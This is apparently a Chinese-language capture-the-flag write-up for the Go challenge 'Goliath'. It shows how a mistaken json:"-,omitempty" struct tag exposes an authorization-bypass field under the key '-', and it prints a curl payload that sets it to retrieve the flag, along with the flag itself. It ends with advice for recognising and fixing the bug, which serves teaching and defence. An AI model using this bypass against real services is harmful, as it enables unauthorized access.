# Goliath

## 题目简述

Go 服务把 `/flag` 的 JSON 请求解码到：

```go
type FlagServiceRequest struct {
    Password       string `json:"password,omitempty"`
    BypassPassword bool   `json:"-,omitempty"`
}
```

开发者显然想用 `-` 忽略 `BypassPassword`，但 `encoding/json` 只有标签内容恰好为 `json:"-"` 时才忽略字段。`json:"-,omitempty"` 会把 JSON 字段名设为字面量 `-`，并附带 `omitempty` 选项，因此客户端可以直接控制该布尔值。

## 解题过程

处理函数在反序列化后执行：

```go
if req.BypassPassword ||
   subtle.ConstantTimeCompare([]byte(req.Password), []byte(fs.flagPassword)) == 1 {
    // 返回 flag
}
```

向 `/flag` 提交名为 `-` 的字段即可让短路条件成立：

```bash
curl 'http://HOST/flag' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"password":"","-":true}'
```

返回：

```json
{"flag":"grey{@re_y0u_4n_@dm1n?}"}
```

仓库中的官方 `solve.sh` 体现了相同 payload，但把包含 `$HOST` 的 URL 放在单引号内，shell 不会展开变量；上面的命令已把该快照错误改为可运行形式。Go 对特殊 `-` 标签的规则可由 [`encoding/json` 官方文档](https://pkg.go.dev/encoding/json)核对，正文已完整解释其在本题中的具体效果。

## 方法总结

- 核心技巧：利用错误的 Go JSON struct tag，把本应隐藏的授权绕过字段暴露为键名 `-`。
- 识别信号：敏感字段使用 `json:"-,option"` 而不是精确的 `json:"-"`，鉴权又直接信任该字段。
- 复用要点：struct tag 的名称与选项以逗号分隔；安全字段不应只依赖序列化标签隐藏，更不应存在客户端可控的授权旁路布尔值。
